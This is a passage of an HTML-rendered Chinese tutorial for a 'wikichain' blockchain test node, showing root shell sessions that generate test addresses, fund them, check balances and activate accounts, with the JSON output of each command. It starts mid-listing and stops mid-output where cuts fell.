CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"address"</span> : <span class="cm-string">"wNuJM44FPC5NxearNLP98pg295VqP7hsqu"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"value"</span> : <span class="cm-number">210000000000000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"address"</span> : <span class="cm-string">"wP64X59EoRmeq2M5GrJ23UVttE9uxnuoFa"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"value"</span> : <span class="cm-number">210000000000000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"address"</span> : <span class="cm-string">"wQewSbKL5kAfpwnrivSiCcaiFffgNva4uB"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"value"</span> : <span class="cm-number">210000000000000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"address"</span> : <span class="cm-string">"wQquTWgzNzLtjUV4Du57p9YAEGdKvgXs9t"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"value"</span> : <span class="cm-number">210000000000000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"address"</span> : <span class="cm-string">"wRQwgYkPNe1oX9Ts3cfuQ4KerqiV2e8gqM"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"value"</span> : <span class="cm-number">210000000000000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"address"</span> : <span class="cm-string">"wSjMDgKWHC2MzrUamhJtyyR2FTtw8oMUfx"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"value"</span> : <span class="cm-number">210000000000000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"address"</span> : <span class="cm-string">"wSms4pZnNe7bxjouLxUXQLowc7JqtNps94"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"value"</span> : <span class="cm-number">210000000000000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"address"</span> : <span class="cm-string">"wT75mYY9C8xgqVgXquBmEfRmAXPDpJHU62"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"value"</span> : <span class="cm-number">210000000000000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"address"</span> : <span class="cm-string">"wUt89R4bjD3Ca6Vb7mk18oGsVtSTCxJu2q"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"value"</span> : <span class="cm-number">210000000000000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"address"</span> : <span class="cm-string">"wVTUdfEaeAAVSuXKrmMyqQXH5j5Z9oGmTt"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"value"</span> : <span class="cm-number">210000000000000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"postion"</span> : <span class="cm-string">"inblock"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 1365px;"></div><div class="CodeMirror-gutters" style="display: none; height: 1365px;"></div></div></div></pre><h3><a name='header-n910' class='md-header-anchor '></a>生成测试地址、充值、激活地址</h3><h4><a name='header-n911' class='md-header-anchor '></a>生成测试地址</h4><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. getnewaddress</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"addr"</span> : <span class="cm-string">"wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"minerpubkey"</span> : <span class="cm-string">"no"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. getnewaddress</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"addr"</span> : <span class="cm-string">"whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"minerpubkey"</span> : <span class="cm-string">"no"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 238px;"></div><div class="CodeMirror-gutters" style="display: none; height: 238px;"></div></div></div></pre><h4><a name='header-n913' class='md-header-anchor '></a>充值</h4><pre spellcheck="false" class="md-fences mock-cm md-end-block" lang="" contenteditable="false" cid="n914" mdtype="fences">root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. sendtoaddress wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC 100000000000
{
    "hash" : "334f447dfd284b2a084560f57d3c4ad044cde1fc41470c68ffeae55aefe270fb"
}
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. sendtoaddress whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1 100000000000
{
    "hash" : "2ab57b070aa87aac85afaf21fd18e4e4211017f7104ab18980ccef287d750012"
}
</pre><h4><a name='header-n915' class='md-header-anchor '></a>查询余额</h4><blockquote><p>充值后，需要出块之后才能到账，可以通过查询交易信息确认是否到账，可以查询到包含上述交易 hash：</p><p>334f447dfd284b2a084560f57d3c4ad044cde1fc41470c68ffeae55aefe270fb、2ab57b070aa87aac85afaf21fd18e4e4211017f7104ab18980ccef287d750012</p><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. listtx</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"ConfirmTx"</span> : [</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"2ab57b070aa87aac85afaf21fd18e4e4211017f7104ab18980ccef287d750012"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"334f447dfd284b2a084560f57d3c4ad044cde1fc41470c68ffeae55aefe270fb"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"8ebdb18e325ae00259e6072f5c5b403dd02c3b1847c16a3f59a2c3e46c4e5cb4"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"f37c59ed4b4af2a85b072a823cd3c720a8fd39f8903138a1ff41d29579a9a78e"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"bba67872503e0eeb65b83c8e932778e7aae7cd8b379645a5cb766a072a0ad561"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"UnConfirmTx"</span> : [</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 284px;"></div><div class="CodeMirror-gutters" style="display: none; height: 284px;"></div></div></div></pre></blockquote><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. getbalance wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"balance"</span> : <span class="cm-number">1000</span>.00000000</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. getbalance whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"balance"</span> : <span class="cm-number">1000</span>.00000000</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 238px;"></div><div class="CodeMirror-gutters" style="display: none; height: 238px;"></div></div></div></pre><h4><a name='header-n923' class='md-header-anchor '></a>激活地址</h4><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. registaccounttx wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC 100000</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"hash"</span> : <span class="cm-string">"00d16a254cedfbb37a9073453b6e522250c7a0cdc70905e24cbdb0210eaf6bfa"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. registaccounttx whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1 100000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"hash"</span> : <span class="cm-string">"82ab10800ec73221e6f03620808a5e4cdb46554e71989b98679700302ec830ce"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 238px;"></div><div class="CodeMirror-gutters" style="display: none; height: 238px;"></div></div></div></pre><h4><a name='header-n925' class='md-header-anchor '></a>确认地址已激活</h4><blockquote><p><strong>账户余额计算：</strong>100000000000 - 100000 = 99999900000</p><p><strong>根据字段 RegID 判断是否已激活：</strong>RegID 分别为 446-1、448-1，表示该地址已激活。</p></blockquote><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. getaccountinfo wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"Address"</span> : <span class="cm-string">"wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"KeyID"</span> : <span class="cm-string">"01650a07447041ce645146117803b58f02eedc6b"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"RegID"</span> : <span class="cm-string">"71-1"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"PublicKey"</span> : <span class="cm-string">"02c3f558fe4479a10139345b8f43e4a370edaffd7889ab33fa6e386a56d3608209"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"MinerPKey"</span> : <span class="cm-string">""</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"Balance"</span> : <span class="cm-number">99999900000</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"Votes"</span> : <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"UpdateHeight"</span> : <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"voteFundList"</span> : [</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"postion"</span> : <span class="cm-string">"inblock"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. getaccountinfo whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"Address"</span> : <span class="cm-string">"whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"KeyID"</span> : <span class="cm-string">"f2cb5a8df46bdbe2c7e82c544be69caef703ae50"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"RegID"</span> : <span class="cm-string">"72-1"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"PublicKey"</span> : <span class="cm-string">"0351ae1238e081dc24068eeb2131fc1d8680d2089c5939ceabe78cfc92f7d9fdf2"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"MinerPKey"</span> : <span class="cm-string">""</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"Balance"</span> : <span class="cm-number">99999900000</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"Votes"</span> : <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"UpdateHeight"</span> : <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"voteFundList"</span> : [</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"postion"</span> : <span class="cm-string">"inblock"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. getbalance wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"balance"</span> : <span class="cm-number">999</span>.99900000</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. getbalance whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"balance"</span> : <span class="cm-number">999</span>.99900000</span></pre><pre class=" 